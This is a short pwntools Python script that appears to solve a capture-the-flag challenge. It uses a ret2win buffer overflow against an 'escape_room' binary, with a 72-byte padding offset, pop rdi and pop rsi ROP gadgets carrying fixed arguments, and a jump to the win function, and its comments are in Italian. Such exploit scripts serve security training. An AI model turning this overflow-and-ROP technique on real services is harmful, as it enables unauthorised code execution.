#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF("./escape_room", checksec=False)
context.arch = "amd64"
context.os = "linux"
# context.log_level = "debug"

REMOTE_HOST = "offsec.m0lecon.it"
REMOTE_PORT = 13517

OFFSET = 72


"""
[BUFFER]    64
[RBP]       8
[RET]       <--

"""

rop = ROP(elf)
pop_rdi = 0x401287 #ROPgadget --binary ./escape | grep "pop"
pop_rsi = 0x401289 #ROPgadget --binary ./escape | grep "pop"
ret     = 0x40101a #ROPgadget --binary ./escape | grep "ret"


win = 0x40121b # found with gdb, disass win



p = process(elf.path)
#p = remote(REMOTE_HOST, REMOTE_PORT)

p.recvuntil(b"keys?\n")


"""
L'idea qui è di fare un ret2win ,per prima cosa però bisogna fare il pop degli argometi che si aspetta la funzione win(arg1,arg2), che li pusha rispettivamente da RDI e RSI. Quindi cerchiamo un gadget POP RDI per il primo argomento e un POP RSI per il secondo argomento e componiamo il payload .
"""
payload = flat(
    b"A" * OFFSET,
    p64(ret),
    p64(pop_rdi),#<-- carica in RDI il valore successivo (ARG1) 
    0xdeadbeef, 
    p64(pop_rsi), 
    0xcafebabe,#<-- carica in RSI il valore successivo (ARG2)
    p64(win),
)

p.send(payload)
p.interactive()





